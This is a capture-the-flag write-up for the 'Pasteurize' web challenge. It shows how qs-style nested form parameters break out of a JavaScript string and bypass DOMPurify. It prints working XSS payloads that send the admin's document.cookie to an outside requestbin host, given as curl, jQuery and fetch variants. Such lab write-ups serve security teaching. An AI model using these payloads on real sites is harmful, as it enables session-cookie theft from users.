# Pasteurize
Category: Web

> This doesn't look secure. I wouldn't put even the littlest secret in here. My source tells me that third parties might have implanted it with their little treats already. Can you prove me right?

## Solution

We visit the attached link and get a simple form where we can enter some text:

```html
<div class="container w-50 pt-5">
    <h3>Create new paste</h3>
    <form class="form" method="post">
        <textarea class="form-control" name="content"></textarea>
        <input type="submit" class="mt-3 btn btn-primary btn-block" value="Submit">
    </form>

</div>

<a href="/source" style="display:none">Source</a>
```

We also get a hidden link to "/source" which we'll return to in a moment.

Once we submit the form, we arrive to a new page where the text is displayed.

```html

<div class="card-header">
    <a id="note-title" class="card-title"></a>
</div>
<div class="card-body">
    <div id="note-content"></div>
</div>
```

The div is populated via Javascript:

```javascript
<!-- TODO: Fix b/1337 in /source that could lead to XSS -->

<script>
    const note = "Test";
    const note_id = "213615b7-7538-4d66-8bca-b3b063c081d5";
    const note_el = document.getElementById('note-content');
    const note_url_el = document.getElementById('note-title');
    const clean = DOMPurify.sanitize(note);
    note_el.innerHTML = clean;
    note_url_el.href = `/${note_id}`;
    note_url_el.innerHTML = `${note_id}`;
</script>
```

There's also a button which allows to share the post with the admin:
```html
<button type="submit" class="btn btn-link col-md-6 border-right">share with TJMike🎤</button>
```

Notice the comment, pointing again to `/source`. Time to check it out:

```javascript
const express = require('express');
const bodyParser = require('body-parser');
const utils = require('./utils');
const Recaptcha = require('express-recaptcha').RecaptchaV3;
const uuidv4 = require('uuid').v4;
const Datastore = require('@google-cloud/datastore').Datastore;

/* Just reCAPTCHA stuff. */
const CAPTCHA_SITE_KEY = process.env.CAPTCHA_SITE_KEY || 'site-key';
const CAPTCHA_SECRET_KEY = process.env.CAPTCHA_SECRET_KEY || 'secret-key';
console.log("Captcha(%s, %s)", CAPTCHA_SECRET_KEY, CAPTCHA_SITE_KEY);
const recaptcha = new Recaptcha(CAPTCHA_SITE_KEY, CAPTCHA_SECRET_KEY, {
  'hl': 'en',
  callback: 'captcha_cb'
});

/* Choo Choo! */
const app = express();
app.set('view engine', 'ejs');
app.set('strict routing', true);
app.use(utils.domains_mw);
app.use('/static', express.static('static', {
  etag: true,
  maxAge: 300 * 1000,
}));

/* They say reCAPTCHA needs those. But does it? */
app.use(bodyParser.urlencoded({
  extended: true
}));

/* Just a datastore. I would be surprised if it's fragile. */
class Database {
  constructor() {
    this._db = new Datastore({
      namespace: 'littlethings'
    });
  }
  add_note(note_id, content) {
    const note = {
      note_id: note_id,
      owner: 'guest',
      content: content,
      public: 1,
      created: Date.now()
    }
    return this._db.save({
      key: this._db.key(['Note', note_id]),
      data: note,
      excludeFromIndexes: ['content']
    });
  }
  async get_note(note_id) {
    const key = this._db.key(['Note', note_id]);
    let note;
    try {
      note = await this._db.get(key);
    } catch (e) {
      console.error(e);
      return null;
    }
    if (!note || note.length < 1) {
      return null;
    }
    note = note[0];
    if (note === undefined || note.public !== 1) {
      return null;
    }
    return note;
  }
}

const DB = new Database();

/* Who wants a slice? */
const escape_string = unsafe => JSON.stringify(unsafe).slice(1, -1)
  .replace(/</g, '\\x3C').replace(/>/g, '\\x3E');

/* o/ */
app.get('/', (req, res) => {
  res.render('index');
});

/* \o/ [x] */
app.post('/', async (req, res) => {
  const note = req.body.content;
  if (!note) {
    return res.status(500).send("Nothing to add");
  }
  if (note.length > 2000) {
    res.status(500);
    return res.send("The note is too big");
  }

  const note_id = uuidv4();
  try {
    const result = await DB.add_note(note_id, note);
    if (!result) {
      res.status(500);
      console.error(result);
      return res.send("Something went wrong...");
    }
  } catch (err) {
    res.status(500);
    console.error(err);
    return res.send("Something went wrong...");
  }
  await utils.sleep(500);
  return res.redirect(`/${note_id}`);
});

/* Make sure to properly escape the note! */
app.get('/:id([a-f0-9\-]{36})', recaptcha.middleware.render, utils.cache_mw, async (req, res) => {
  const note_id = req.params.id;
  const note = await DB.get_note(note_id);

  if (note == null) {
    return res.status(404).send("Paste not found or access has been denied.");
  }

  const unsafe_content = note.content;
  const safe_content = escape_string(unsafe_content);

  res.render('note_public', {
    content: safe_content,
    id: note_id,
    captcha: res.recaptcha
  });
});

/* Share your pastes with TJMike🎤 */
app.post('/report/:id([a-f0-9\-]{36})', recaptcha.middleware.verify, (req, res) => {
  const id = req.params.id;

  /* No robots please! */
  if (req.recaptcha.error) {
    console.error(req.recaptcha.error);
    return res.redirect(`/${id}?msg=Something+wrong+with+Captcha+:(`);
  }

  /* Make TJMike visit the paste */
  utils.visit(id, req);

  res.redirect(`/${id}?msg=TJMike🎤+will+appreciate+your+paste+shortly.`);
});

/* This is my source I was telling you about! */
app.get('/source', (req, res) => {
  res.set("Content-type", "text/plain; charset=utf-8");
  res.sendFile(__filename);
});

/* Let it begin! */
const PORT = process.env.PORT || 8080;

app.listen(PORT, () => {
  console.log(`App listening on port ${PORT}`);
  console.log('Press Ctrl+C to quit.');
});

module.exports = app;
```

Let's follow the flow. When the user posts a note, it is handled by `app.post('/')` which generated a UUID and saves it in the DB as-is. The user is then redirected to the note's page, where the request is handled by `app.get('/:id([a-f0-9\-]{36})')` and the note is fetched from the DB, escaped, and returned to the user.

The application has two layers of processing the raw note. At first, the server side performs some escaping by using:

```javascript
const escape_string = unsafe => JSON.stringify(unsafe).slice(1, -1)
  .replace(/</g, '\\x3C').replace(/>/g, '\\x3E');

  // ...

  const unsafe_content = note.content;
  const safe_content = escape_string(unsafe_content);
```

Then, the client side takes the note, sanitizes it via `DOMPurify` and pushes it as HTML to the appropriate `div`.

```javascript
const note = "Test";
const note_el = document.getElementById('note-content');
const clean = DOMPurify.sanitize(note);
note_el.innerHTML = clean;
```

The real problem here is bypassing [DOMPurify](https://github.com/cure53/DOMPurify):

> DOMPurify sanitizes HTML and prevents XSS attacks. You can feed DOMPurify with string full of dirty HTML and it will return a string (unless configured otherwise) with clean HTML. DOMPurify will strip out everything that contains dangerous HTML and thereby prevent XSS attacks and other nastiness.

The application uses the latest version of the library, with no known vulnerabilities, and therefore this seems like a dead-end. DOMPurify is able to strip any malicious content that we throw at it.

```
>>> DOMPurify.sanitize("<img src='x'>")
"<img src=\"x\">"
>>> DOMPurify.sanitize("<img src='x' onerror='alert(1)'>")
"<img src=\"x\">"
```

So if that's not the way to go, what else is left? The IDs are generated by the server side application and the user can't control them, so that's a dead-end too. But what about this line over here:

```javascript
const note = "Test";
```

This is how the server side transfers the note to the client side - it creates a Javascript snippet with the note content in the HTML page it sends to the client. This happens before DOMPurify is called (in fact, the contents of this variable is what's sent to DOMPurify). So if we're able to somehow manipulate this variable, maybe we can escape the sanitization.

Let's first try to send something like:
```
"; alert(1); //
```

Hoping that the final result will be:
```javascript
const note = ""; alert(1); //";
```

However, if we send this:

```console
root@kali:/media/sf_CTFs/google/pasteurize# curl 'https://pasteurize.web.ctfcompetition.com/' -s -L -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'content="; alert(1); //' | grep "const note "
        const note = "\"; alert(1); //";
```

We see that the quote is escaped, and we are unable to break out of the string.

However, not all is lost yet. Luckily, the application defined the following configuration for the sake of the CAPTCHA:
```javascript
/* They say reCAPTCHA needs those. But does it? */
app.use(bodyParser.urlencoded({
  extended: true
}));
```

What does this mean? Let's check the [documentation](https://github.com/expressjs/body-parser):

> The extended option allows to choose between parsing the URL-encoded data with the querystring library (when false) or the qs library (when true). The "extended" syntax allows for rich objects and arrays to be encoded into the URL-encoded format, allowing for a JSON-like experience with URL-encoded. For more information, please see the [qs library](https://www.npmjs.com/package/qs#readme).

If we follow the link, we get an example:

```javascript
/*
qs allows you to create nested objects within your query strings, 
by surrounding the name of sub-keys with square brackets []. 
For example, the string 'foo[bar]=baz' converts to:
*/
assert.deepEqual(qs.parse('foo[bar]=baz'), {
    foo: {
        bar: 'baz'
    }
});
```

Let's try that:

```console
root@kali:/media/sf_CTFs/google/pasteurize# curl 'https://pasteurize.web.ctfcompetition.com/' -s -L -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'content[foo]=baz' | grep "const note "
        const note = ""foo":"baz"";
```

This definitely looks like something we can work with! Let's try something a bit more complicated:

```console
root@kali:/media/sf_CTFs/google/pasteurize# curl 'https://pasteurize.web.ctfcompetition.com/' -s -L -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'content[;foo//]=baz' | grep "const note "
        const note = "";foo//":"baz"";
```

Bingo, we escaped the quotes. All that's left is to enter a Javascript expression that will steal the Admin's cookie, and report the post.

```console
root@kali:/media/sf_CTFs/google/pasteurize# curl 'https://pasteurize.web.ctfcompetition.com/' -s -L -H 'Content-Type: application/x-www-form-urlencoded' --data "content[; fetch('https://enktailvzebp.x.pipedr
eam.net/?cookie='.concat(btoa(document.cookie))); //]=baz" | grep "const note"
        const note = ""; fetch('https://enktailvzebp.x.pipedream.net/?cookie='.concat(btoa(document.cookie))); //":"baz"";
        const note_id = "a6e8c8bf-49ae-48a5-a0b3-edd299a4c368";
```

A few seconds after reporting the post, we get a hit in our requestbin, containing the flag:

```
/?cookie=c2VjcmV0PUNURntFeHByZXNzX3QwX1RyMHVibDNzfQ==
```

Decoded:
```console
root@kali:/media/sf_CTFs/google/pasteurize# echo c2VjcmV0PUNURntFeHByZXNzX3QwX1RyMHVibDNzfQ== | base64 -d
secret=CTF{Express_t0_Tr0ubl3s}
```

## Appendix A: Other ways to send the request

It might be a bit more convenient to use the browser's Javascript Console to send the request.

JQuery knows how to serialize an object automatically:
```javascript
$.ajax({
        url: '/',
        type: 'POST',
        data: {"content": { '; fetch(\'https://enktailvzebp.x.pipedream.net/?cookie=\' + btoa(document.cookie)); //': 'baz'}}, 
        complete: function (response)
        {
            console.log(response.responseText)
        }
    });
```

`fetch` on the other hand, does not:
```javascript
await fetch("https://pasteurize.web.ctfcompetition.com/", {
    "credentials": "omit",
    "headers": {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    },
    "referrer": "https://pasteurize.web.ctfcompetition.com/1c36eaaa-35d0-4dda-ba70-fd7263bf2fe0",
    "body": "content%5B%3B+fetch('https%3A%2F%2Fenktailvzebp.x.pipedream.net%2F%3Fcookie%3D'+%2B+btoa(document.cookie))%3B+%2F%2F%5D=baz",
    "method": "POST",
    "mode": "cors"
});

// or

data = {"content": { '; fetch(\'https://enktailvzebp.x.pipedream.net/?cookie=\' + btoa(document.cookie)); //': 'baz'}};
searchParams = new URLSearchParams();
for (const prop in data) {
  searchParams.set(prop, data[prop]);
}
await fetch("https://pasteurize.web.ctfcompetition.com/", {
    "credentials": "omit",
    "headers": {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    },
    "referrer": "https://pasteurize.web.ctfcompetition.com/1c36eaaa-35d0-4dda-ba70-fd7263bf2fe0",
    "body": searchParams,
    "method": "POST",
    "mode": "cors"
});
```